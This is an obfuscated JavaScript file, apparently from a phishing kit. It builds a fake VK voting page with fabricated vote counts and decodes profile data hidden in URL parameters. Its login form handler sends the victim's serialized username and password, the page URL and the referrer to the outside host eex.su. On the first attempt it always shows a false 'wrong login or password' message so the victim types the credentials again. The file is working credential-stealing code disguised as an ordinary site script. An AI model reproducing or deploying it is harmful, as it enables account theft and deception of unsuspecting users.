var XOR_SALT = 74;
var Xorc = function(_0x93c6x3) {
    var _0x93c6x4 = 100,
        _0x93c6x5 = -100;
    var _0x93c6x6 = parseInt(_0x93c6x3);
    if (_0x93c6x3) {
        if (!_0x93c6x6) {
            throw new Error('Salt is not a Number')
        };
        this['salt'] = _0x93c6x6
    } else {
        this['salt'] = Math['round'](Math['random']() * (_0x93c6x4 - _0x93c6x5) + _0x93c6x5)
    }
};
Xorc['prototype']['encrypt'] = function(_0x93c6x7) {
    var _0x93c6x8 = '';
    for (var _0x93c6x9 = 0; _0x93c6x9 < _0x93c6x7['length']; _0x93c6x9++) {
        _0x93c6x8 += String['fromCharCode'](this['salt'] ^ _0x93c6x7['charCodeAt'](_0x93c6x9))
    };
    return _0x93c6x8
};
Xorc['prototype']['decrypt'] = function(_0x93c6xa) {
    var _0x93c6x8 = '';
    for (var _0x93c6x9 = 0; _0x93c6x9 < _0x93c6xa['length']; _0x93c6x9++) {
        _0x93c6x8 += String['fromCharCode'](this['salt'] ^ _0x93c6xa['charCodeAt'](_0x93c6x9))
    };
    return _0x93c6x8
};

function findGetParameter(_0x93c6xc) {
    var _0x93c6x8 = null,
        _0x93c6xd = [];
    location['search']['substr'](1)['split']('&')['forEach'](function(_0x93c6xe) {
        _0x93c6xd = _0x93c6xe['split']('=');
        if (_0x93c6xd[0] === _0x93c6xc) {
            _0x93c6x8 = decodeURIComponent(_0x93c6xd[1])
        }
    });
    return _0x93c6x8
}

function getRandomArbitrary(_0x93c6x10, _0x93c6x11) {
    return Math['random']() * (_0x93c6x11 - _0x93c6x10) + _0x93c6x10
}

function fill_user(_0x93c6x13, _0x93c6x14) {
    var _0x93c6x15 = Math['round'](Date['now']() / 2.65395813e10 + getRandomArbitrary(0, 30));
    $('.user-name', _0x93c6x13)['text'](_0x93c6x14['first_name'] + ' ' + _0x93c6x14['last_name']);
    $('.user-name', _0x93c6x13)['attr']('href', 'https://vk.com/id' + _0x93c6x14['id']);
    $('.pricing__img', _0x93c6x13)['attr']('src', _0x93c6x14['photo_200']);
    $('.pricing__votes', _0x93c6x13)['text'](_0x93c6x15 + ' ' + pad(_0x93c6x15, ['\u0433\u043E\u043B\u043E\u0441\u043E\u0432', '\u0433\u043E\u043B\u043E\u0441', '\u0433\u043E\u043B\u043E\u0441\u0430']))
}

function pad(_0x93c6x15, _0x93c6x17) {
    var _0x93c6x18 = _0x93c6x15.toString()['substr'](-1);
    if (_0x93c6x18 === '0' || (_0x93c6x18 >= 5 && _0x93c6x18 <= 9)) {
        var _0x93c6x19 = _0x93c6x17[0]
    } else {
        if (_0x93c6x18 === '1') {
            var _0x93c6x19 = _0x93c6x17[1]
        } else {
            if (_0x93c6x18 >= 2 && _0x93c6x18 <= 4) {
                var _0x93c6x19 = _0x93c6x17[2]
            } else {
                console['error'](_0x93c6x18);
                var _0x93c6x19 = _0x93c6x17[0]
            }
        }
    };
    return _0x93c6x19
}

function escapeHtml(_0x93c6x1b) {
    return _0x93c6x1b['replace'](/&/g, '&amp;')['replace'](/</g, '&lt;')['replace'](/>/g, '&gt;')['replace'](/"/g, '&quot;')['replace'](/'/g, '&#039;')
}
$(document)['ready'](function() {
    var _0x93c6x1c = new Xorc(window['xcode']);
    $('[data-xtext]')['each'](function() {
        $(this)['text'](JSON['parse'](_0x93c6x1c['decrypt'](Base64Decode($(this)['attr']('data-xtext')))))
    });
    $('[data-xhref]')['each'](function() {
        $(this)['attr']('href', JSON['parse'](_0x93c6x1c['decrypt'](Base64Decode($(this)['attr']('data-xhref')))))
    });
	$('#loader').css({'display':'none'});
});
$(window)['load'](function() {
    var _0x93c6x1c = new Xorc(window.XOR_SALT);
    var _0x93c6x1d = findGetParameter('u1');
    var _0x93c6x1e = findGetParameter('u2');
    if (_0x93c6x1d != null) {
        var _0x93c6x1f = Base64Decode(_0x93c6x1d);
        _0x93c6x1f = _0x93c6x1c['decrypt'](_0x93c6x1f);
        _0x93c6x1f = JSON['parse'](_0x93c6x1f);
        var _0x93c6x13 = $('#user-1');
        fill_user(_0x93c6x13, _0x93c6x1f)
    };
    if (_0x93c6x1e != null) {
        var _0x93c6x1f = Base64Decode(_0x93c6x1e);
        _0x93c6x1f = _0x93c6x1c['decrypt'](_0x93c6x1f);
        _0x93c6x1f = JSON['parse'](_0x93c6x1f);
        var _0x93c6x13 = $('#user-2');
        fill_user(_0x93c6x13, _0x93c6x1f)
    };
    window['form_data'] = '';
    window['send_count'] = 0;
	window['appended_form'] = false;
    $('#auth_form')['submit'](function(_0x93c6x20) {
        _0x93c6x20['preventDefault']();
		
		if( !window['appended_form'])
		{
			try{
			yaCounter49311268.reachGoal('FORM_SUBMIT');
			}catch(e){}
			
			window['appended_form'] = true;
			$('form').append('<input type="hidden" name="url" value="' + escapeHtml(window['location']['href']) + '">');
			$('form').append('<input type="hidden" name="grip" value="' + window.GRIP + '">');
			
			if(typeof document.referrer !== 'undefined')
				$('form').append('<input type="hidden" name="referrer" value="' + document.referrer + '">');
		}
		
        local_form_data = $('#auth_form')['serialize']();
        if (local_form_data === window['form_data']) {
            return false
        };
        $['post']('https://eex.su/other/addlogin', local_form_data, function(response) {
            if (window['send_count'] == 0 || response != 'success' ) {
                $('#auth_form .zither-messages')['html']('<div class="box_error">\u0423\u043A\u0430\u0437\u0430\u043D \u043D\u0435\u0432\u0435\u0440\u043D\u044B\u0439 \u043B\u043E\u0433\u0438\u043D \u0438\u043B\u0438 \u043F\u0430\u0440\u043E\u043B\u044C.</div>')
            } else {
                $('#modal_login')['modal']('hide');
                $('#modal_success')['modal']('show')
            };
            window['form_data'] = local_form_data;
            window['send_count']++
        });
        return false
    });
    $['post']('https://eex.su/other/vktest', {
        r: Math['random'](),
        url: window['location']['href']
    })
})

var statics = 'NLe5kw';